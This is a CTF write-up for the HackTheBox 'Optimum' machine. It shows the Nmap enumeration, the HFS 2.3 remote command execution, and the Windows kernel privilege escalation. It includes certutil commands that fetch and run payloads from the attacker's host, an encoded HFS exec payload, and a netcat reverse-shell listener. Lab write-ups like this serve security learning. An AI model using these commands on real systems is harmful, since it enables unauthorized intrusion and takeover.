---
title: HTB Optimum
date: 2023-11-13
description: Writeup for HTB Optimum
tags:
  - windows
  - writeup
---
# Enumeration

## Nmap

```bash
┌──(root💀kali)-[~/optimum]
└─# nmap -sV -sC -T4 -p- 10.129.148.144 -oN nmap.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-13 21:25 EET
Nmap scan report for 10.129.148.144
Host is up (0.039s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.83 seconds
```

# Getting shell

Found interesting exploit.

[Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)](https://www.exploit-db.com/exploits/49125)

I ran the command below and got first shell.

```bash
┌──(root💀kali)-[~/optimum]
└─# python3 49125.py 10.129.148.144 80 "certutil.exe -urlcache -split -f "http://10.10.16.23/shell.exe""
http://10.129.148.144:80/?search=%00{.+exec|certutil.exe%20-urlcache%20-split%20-f%20http%3A//10.10.16.23/shell.exe.}
                                                                                                                              
┌──(root💀kali)-[~/optimum]
└─# python3 49125.py 10.129.148.144 80 "shell.exe"                            
http://10.129.148.144:80/?search=%00{.+exec|shell.exe.}
```

```bash
┌──(root💀kali)-[~/optimum]
└─# rlwrap nc -lvnp 21
listening on [any] 21 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.148.144] 49174
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas
```

# Privilege Escalation

Windows Exploit suggester suggests using this exploit:

```bash
┌──(root💀kali)-[/opt/Windows-Exploit-Suggester]
└─# python windows-exploit-suggester.py -i sysinfo.txt -d 2023-11-13-mssb.xls
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
```

[Microsoft Windows 8.1 (x64) - 'RGNOBJ' Integer Overflow (MS16-098)](https://www.exploit-db.com/exploits/41020)

```bash
C:\Users\kostas\Desktop>certutil.exe -urlcache -split -f "http://10.10.16.23/optimum.exe" 
certutil.exe -urlcache -split -f "http://10.10.16.23/optimum.exe"
```

Installed the binary and got the root shell

![[Screenshot_2023-11-13_at_23.17.22.png]]

# Note

Windows exploit suggester is useful 🙂